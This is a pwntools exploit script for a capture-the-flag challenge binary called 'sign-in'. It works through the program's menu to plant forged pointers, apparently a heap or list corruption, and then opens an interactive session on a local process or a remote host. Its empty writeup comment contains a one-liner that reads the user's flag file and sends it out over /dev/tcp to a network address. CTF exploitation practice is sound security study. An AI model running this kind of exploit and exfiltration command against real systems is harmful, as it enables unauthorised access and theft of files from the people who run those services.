from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./sign-in")
    if args.GDB:
        gdb.attach(r,"b *0x401441")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

#leak("libc",hex(libc))
fake_next = p64(0x666)
fake_next2 = p64(0x4041c0)
fake_next3 = p64(0x4041a0)
sla("> ","1")
sla(": ","aaa")
sa(": ",fake_next)

sla("> ","1")
sla(": ","bbb")
sa(": ",fake_next2)

# sla("> ","1")
# sla(": ","ggg")
# sa(": ",fake_next3)

sla("> ","2")
sla(": ","aaa")
sa(": ",fake_next)
sla("> ","3")

sla("> ","2")
sla(": ","bbb")
sa(": ",fake_next2)
sla("> ","3")


# sla("> ","2")
# sla(": ","ggg")
# sa(": ",fake_next3)
# sla("> ","3")

sla("> ","1")
sa(": ","cc")
sa(": ","dd")

sla("> ","1")
sa(": ","ee")
sa(": ","ff")



# sla("> ","1")
# sa(": ","hhh")
# sa(": ","iii")
r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''